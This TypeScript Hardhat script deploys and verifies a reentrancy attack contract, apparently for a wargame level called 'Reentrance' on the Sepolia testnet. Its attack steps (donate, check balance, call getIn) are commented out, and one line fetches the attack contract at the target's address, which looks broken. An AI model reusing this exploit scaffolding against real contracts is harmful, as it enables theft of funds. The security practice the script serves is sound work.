import { ethers, network } from "hardhat";
import { DeployFunction } from "hardhat-deploy/dist/types";
import { HardhatRuntimeEnvironment } from "hardhat/types";
import { devChains, networkConfig } from "../helper-hardhat-config";

const deployReentranceAttack: DeployFunction = async (
  hre: HardhatRuntimeEnvironment
) => {
  // env variables
  const { getNamedAccounts, deployments } = hre;
  const { deploy, log, get } = deployments;
  const { deployer } = await getNamedAccounts();

  const attackValue = ethers.utils.parseEther("0.0001");

  const reentranceAddress = "0x44c5B87E7858325EdEb86ab96Ff8998f97366A31"; // sepolia
  //const reentranceAddress = "0x378B485184fbf9dCb21d087E39847E9b60644fD2"; // goerli

  const reentrance = await ethers.getContractAt(
    "Reentrance",
    reentranceAddress
  );

  /** deploy script (step 1) */
  const args: any[] = [reentranceAddress];
  //const reentranceAttack = await deploy("ReentranceAttack", {
  //  from: deployer,
  //  args: args,
  //  log: true,
  //  waitConfirmations: networkConfig[network.name].blockConfirmations || 1,
  //});

  /** from here on attack script (step 2) */

  const reentranceAttack = await get("ReentranceAttack");

  //const donationTx = await reentrance.donate(reentranceAttack.address, {
  //  value: attackValue,
  //});

  //const donationTxReceipt = await donationTx.wait(1);

  //const currentBalance = (
  //  await reentrance.balanceOf(reentranceAttack.address)
  //).toString();
  //console.log(currentBalance);

  const attackContract = await ethers.getContractAt(
    "ReentranceAttack",
    reentrance.address
  );
  //const getIntx = await attackContract.getIn({ gasLimit: 1000000000 });
  //console.log(getIntx);

  /** optional: verify  */
  if (!devChains.includes(network.name)) {
    log("------- verifying started --------");
    await hre.run("verify:verify", {
      address: reentranceAttack.address,
      contract: "contracts/ReentranceAttack.sol:ReentranceAttack", //Filename.sol:ClassName
      constructorArguments: args,
    });
  }
};

export default deployReentranceAttack;

deployReentranceAttack.tags = ["all", "reentrance"];
